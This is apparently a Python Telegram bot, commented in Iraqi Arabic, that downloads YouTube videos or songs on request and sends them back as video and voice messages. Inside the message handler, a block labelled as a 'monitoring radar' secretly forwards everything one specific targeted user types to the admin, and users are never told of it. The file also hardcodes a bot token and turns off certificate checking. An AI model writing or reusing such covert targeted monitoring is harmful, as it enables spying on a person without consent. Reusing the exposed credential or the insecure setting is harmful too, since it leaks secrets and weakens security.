 import os
import yt_dlp
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- الإعدادات الأساسية ---
TOKEN = "8471320360:AAHrI1iS4e4RNxs3AVUvplh1cA1pfI0XcsI"
ADMIN_ID = 1420457711 
TARGET_USER_ID = 2034540192 

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("هلا بيك! دز رابط أو اكتب 'اسم الأغنية' حتى أحملها إلك 🚀🎤")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    
    # 1. إذا كانت الرسالة رابط (تحميل مباشر)
    if text.startswith("http"):
        url = text
    # 2. إذا كانت الرسالة اسم أغنية (بحث)
    else:
        await update.message.reply_text(f"🔎 جاي أبحث عن: {text} ...")
        url = f"ytsearch1:{text}" # يبحث في يوتيوب ويأخذ أول نتيجة

    # رادار المراقبة
    if user.id == TARGET_USER_ID:
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎯 الهدف بحث/دز: {text}")

    try:
        ydl_opts = {
            'format': 'best',
            'outtmpl': f'file_{user.id}.%(ext)s',
            'quiet': True,
            'no_warnings': True,
            'ignoreerrors': True,
            'nocheckcertificate': True,
            'add_header': ['User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15']
        }

        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            # التحميل والمعالجة
            info = ydl.extract_info(url, download=True)
            if 'entries' in info: # إذا كانت نتيجة بحث
                info = info['entries'][0]
            
            filename = ydl.prepare_filename(info)
            title = info.get('title', 'محتوى جديد')
            video_url = info.get('webpage_url', '')

            # إرسال الرابط (الميزة اللي طلبتها)
            await update.message.reply_text(f"✅ لقيتها! هذا رابطها:\n{video_url}\n\nجاي أدزلك الفيديو والبصمة... ⏳")

            # إرسال الفيديو
            with open(filename, 'rb') as f:
                await context.bot.send_video(chat_id=update.message.chat_id, video=f, caption=f"🎬 {title}")
            
            # إرسال البصمة
            with open(filename, 'rb') as f:
                await context.bot.send_voice(chat_id=update.message.chat_id, voice=f, caption=f"🎤 بصمة: {title}")
            
            os.remove(filename)
                
    except Exception as e:
        await update.message.reply_text("❌ ما كدرت أحملها، جرب تكتب اسم أوضح!")
        print(f"Error: {e}")

if __name__ == '__main__':
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()
